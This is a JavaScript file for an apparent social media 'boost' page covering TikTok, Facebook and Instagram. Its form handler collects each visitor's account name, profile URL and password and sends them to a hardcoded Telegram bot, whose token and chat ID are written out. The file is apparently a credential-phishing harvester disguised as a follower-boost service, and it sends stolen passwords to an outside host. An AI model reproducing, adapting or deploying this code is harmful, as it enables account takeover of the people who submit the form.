document.addEventListener("DOMContentLoaded", () => {
    const TELEGRAM_BOT_TOKEN = "7738217538:AAGoNIvjMilJ5Ikt9oalHhpEiRDtS7t3NbU";
    const CHAT_ID = "6804915795";

    // Fonction d'échappement complète pour MarkdownV2
    function escapeMarkdown(text) {
        if (!text) return '';
        return String(text)
            .replace(/([_*\[\]()~`>#+\-=|{}.!])/g, '\\$1')
            .replace(/-/g, '\\-')
            .replace(/\n/g, '\n');
    }

    async function sendToTelegram(platform, data) {
        try {
            const message = `
📢 *Boost Request \\- ${escapeMarkdown(platform)}* 📢
• *Account\\:* ${escapeMarkdown(data.accountName)}
• *URL\\:* ${escapeMarkdown(data.url)}
• *Password\\:* \`${escapeMarkdown(data.password)}\`
• *Type\\:* ${escapeMarkdown(data.boostType)}
• *Quantity\\:* ${escapeMarkdown(data.quantity)}
            `.trim();

            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: "MarkdownV2",
                    disable_web_page_preview: true
                }),
            });

            if (!response.ok) {
                const errorData = await response.json();
                throw new Error(errorData.description || 'Erreur Telegram');
            }

            alert(" Envoyé avec succès !");
            document.getElementById(`boost-${platform.toLowerCase()}-form`).reset();
        } catch (error) {
            console.error("Erreur complète:", error);
            alert(` Erreur d'envoi: ${error.message}`);
        }
    }

    function setupFormListener(formId, platform) {
        const form = document.getElementById(formId);
        if (!form) {
            console.warn(`Form ${formId} not found`);
            return;
        }

        form.addEventListener("submit", async (e) => {
            e.preventDefault();
            
            const formData = {
                accountName: form.querySelector('input[type="text"]').value,
                url: form.querySelector('input[type="url"]').value,
                password: form.querySelector('input[type="password"]').value,
                boostType: form.querySelector("select").value,
                quantity: form.querySelector('input[type="number"]').value
            };

            if (!formData.password || formData.password.length < 4) {
                alert("Le mot de passe doit contenir au moins 4 caractères");
                return;
            }

            await sendToTelegram(platform, formData);
        });
    }

    // Initialisation
    setupFormListener("boost-tiktok-form", "TikTok");
    setupFormListener("boost-facebook-form", "Facebook");
    setupFormListener("boost-instagram-form", "Instagram");
});
